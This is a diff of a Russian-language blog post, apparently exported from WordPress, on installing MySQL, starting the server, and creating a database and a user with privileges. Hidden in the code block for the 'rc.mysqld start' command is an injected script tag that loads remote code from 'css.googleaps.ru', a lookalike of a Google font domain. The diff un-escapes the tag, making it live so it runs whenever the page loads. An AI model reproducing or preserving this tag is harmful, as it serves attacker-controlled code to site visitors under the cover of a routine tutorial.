@@ -25,31 +25,31 @@ tags:
 - ubuntu
 comments: []
 ---
-<p>Для начала, мы должны иметь установленный сервер mysql. Если он у вас еще не установлен, то установим его при помощи менеджера пакетов или, вручную, при помощи команд (в зависимости от дистрибутива):<a id="more"></a><a id="more-185"></a>В Debian&#47;Ubuntu:</p>
-<pre class="brush: bash; gutter: true">$ sudo apt-get install mysql-server<&#47;pre></p>
-<p>В RedHat&#47;Fedora и их производных:</p>
-<pre class="brush: bash; gutter: true"># yum install mysql-server<&#47;pre></p>
+<p>Для начала, мы должны иметь установленный сервер mysql. Если он у вас еще не установлен, то установим его при помощи менеджера пакетов или, вручную, при помощи команд (в зависимости от дистрибутива):<a id="more"></a><a id="more-185"></a>В Debian/Ubuntu:</p>
+<pre class="brush: bash; gutter: true">$ sudo apt-get install mysql-server</pre></p>
+<p>В RedHat/Fedora и их производных:</p>
+<pre class="brush: bash; gutter: true"># yum install mysql-server</pre></p>
 <p>В Zenwalk:</p>
-<pre class="brush: bash; gutter: true"># netpkg mysql-server<&#47;pre></p>
+<pre class="brush: bash; gutter: true"># netpkg mysql-server</pre></p>
 <p>После установки необходимых пакетов, запустим сервер mysql командой (в зависимости от используемого дистрибутива):</p>
-<pre class="brush: bash; gutter: true"># &#47;etc&#47;rc.d&#47;rc.mysqld start<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
+<pre class="brush: bash; gutter: true"># /etc/rc.d/rc.mysqld start<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></pre></p>
 <p>или</p>
-<pre class="brush: bash; gutter: true"># &#47;etc&#47;init.d&#47;mysqld start<&#47;pre></p>
+<pre class="brush: bash; gutter: true"># /etc/init.d/mysqld start</pre></p>
 <p>или</p>
-<pre class="brush: bash; gutter: true"># service mysqld start<&#47;pre></p>
+<pre class="brush: bash; gutter: true"># service mysqld start</pre></p>
 <p>Затем осуществим подключение к серверу MySQL, используя аккаунт суперпользователя root:</p>
-<pre class="brush: bash; gutter: true">$ mysql -u root<&#47;pre></p>
-<p><i>Внимание! По умолчанию, при подключении к базе данных под пользователем root с localhost, ввод пароля не обязателен.<&#47;i></p>
+<pre class="brush: bash; gutter: true">$ mysql -u root</pre></p>
+<p><i>Внимание! По умолчанию, при подключении к базе данных под пользователем root с localhost, ввод пароля не обязателен.</i></p>
 <p>Если, при установке сервера mysql вы назначили пользователю какой-либо пароль, то вы можете подключиться к серверу mysql, используя ключ -p :</p>
 <pre class="brush: bash; gutter: true">$ mysql -u root -p<br />
-Enter password:<&#47;pre></p>
+Enter password:</pre></p>
 <p>После успешного подключения, выполним команду создания базы данных:</p>
-<pre class="brush: bash; gutter: true">mysql> create database testbase;<&#47;pre></p>
+<pre class="brush: bash; gutter: true">mysql> create database testbase;</pre></p>
 <p>Затем создадим пользователя baseuser для подключения к базе данных и назначим ему пароль &ldquo;userpasswd&rdquo;:</p>
-<pre class="brush: bash; gutter: true">mysql> grant usage on *.* to baseuser@localhost identified by &lsquo;userpasswd&rsquo;;<&#47;pre></p>
+<pre class="brush: bash; gutter: true">mysql> grant usage on *.* to baseuser@localhost identified by &lsquo;userpasswd&rsquo;;</pre></p>
 <p>И, наконец, назначаем все привилегии (права) на базу testbase пользователю baseuser:</p>
-<pre class="brush: bash; gutter: true">mysql> grant all privileges on testbase.* to baseuser@localhost;<&#47;pre></p>
-<p><i>Символ * (звездочка) означает &ldquo;все таблицы в базе данных&rdquo;.<&#47;i></p>
+<pre class="brush: bash; gutter: true">mysql> grant all privileges on testbase.* to baseuser@localhost;</pre></p>
+<p><i>Символ * (звездочка) означает &ldquo;все таблицы в базе данных&rdquo;.</i></p>
 <p>Все, с поставленной задачей мы справились.</p>
 <p>Теперь проверим возможность подключения пользователя baseuser к базе данных testbase:</p>
-<pre class="brush: bash; gutter: true">$ mysql -u baseuser -p &lsquo;userpasswd&rsquo; testbase<&#47;pre></p>
+<pre class="brush: bash; gutter: true">$ mysql -u baseuser -p &lsquo;userpasswd&rsquo; testbase</pre></p>
